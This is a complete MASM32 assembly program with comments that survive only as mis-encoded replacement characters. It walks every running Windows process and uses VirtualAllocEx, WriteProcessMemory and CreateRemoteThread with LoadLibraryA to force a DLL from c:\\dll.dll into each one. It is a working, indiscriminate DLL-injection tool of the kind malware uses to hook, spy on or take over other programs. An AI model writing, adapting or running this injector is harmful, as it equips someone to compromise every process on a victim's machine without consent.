;===============================================================================;
;                                       Options and Includes                                    
;===============================================================================;
.386                                                                            
option casemap:none                                                             
.model flat,stdcall                                                             
include \tools\masm32\include\windows.inc                                       
includelib \tools\masm32\lib\kernel32.lib                                       
include \tools\masm32\include\kernel32.inc                                      
include \tools\masm32\include\user32.inc                                        
includelib \tools\masm32\lib\user32.lib                                         
include \tools\masm32\include\advapi32.inc                                      
includelib \tools\masm32\lib\advapi32.lib                                       
;===============================================================================;

;===============================================================================;
;                       Initialized Data Section                                
;===============================================================================;
.data                                                                           
        lib db "c:\\dll.dll",0;��� DLL, ������� �������� � ����� �������
        dwSize equ $-lib;������ ������ � ������ DLL                             
        kernelName db "kernel32.dll",0;��� Kernel32.dll                         
        loadlibraryName db "LoadLibraryA",0;��� ������� LoadLibraryA            
        _LoadLibrary dd 0;����� ������� LoadLibrary                             
        ParameterForLoadLibrary dd 0;����� ������ � ������ DLL � ����� �������� 
;===============================================================================;
;                       Uninitialized Data Section                              
;===============================================================================;
.data?                                                                          
;===============================================================================;
        ThreadId dd ?;������������� �����                                       
        hSnap dd ?
        hProcess dd ?
        ProcEntry PROCESSENTRY32 <?>
;===============================================================================;
;                               Code Section                                    
;===============================================================================;
.code
ThreadProc proc
        invoke Sleep,100000
        ret
ThreadProc endp
start:
        invoke CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,0
        mov hSnap,eax
        mov ProcEntry.dwSize,sizeof PROCESSENTRY32
        invoke Process32First,hSnap,offset ProcEntry
NextProcess:
        invoke OpenProcess,PROCESS_CREATE_THREAD or PROCESS_VM_WRITE or PROCESS_VM_OPERATION,\
               0,ProcEntry.th32ProcessID;��������� ������� ���� ����� �������� DLL
        mov hProcess,eax
        invoke GetModuleHandle,offset kernelName;�������� ��������� ������ Kernel32.dll
        invoke GetProcAddress,eax,offset loadlibraryName;�������� ����� ������� LoadLibrary
        mov _LoadLibrary,eax
        ;�������� ������ � ��������� ��������
        invoke VirtualAllocEx,hProcess,NULL,dwSize,MEM_RESERVE or MEM_COMMIT,PAGE_READWRITE
        mov ParameterForLoadLibrary,eax
        ;������ ������ � ������ DLL � �� ������ ��������
        invoke WriteProcessMemory,hProcess,eax,offset lib,dwSize,NULL
        ;������� ��������� �����, ������� �������� LoadLibrary, 
        ;��� ����� �������� DLL � �������� ������������ ������ ��������.  
        invoke CreateRemoteThread,hProcess,NULL,NULL,_LoadLibrary,ParameterForLoadLibrary,\
                                  NULL,offset ThreadId
        invoke Process32Next,hSnap,offset ProcEntry
        .if eax!=0
                jmp NextProcess
        .endif
        invoke ExitProcess,0
end start
;===============================================================================;
;                               End Program                                                             
;===============================================================================;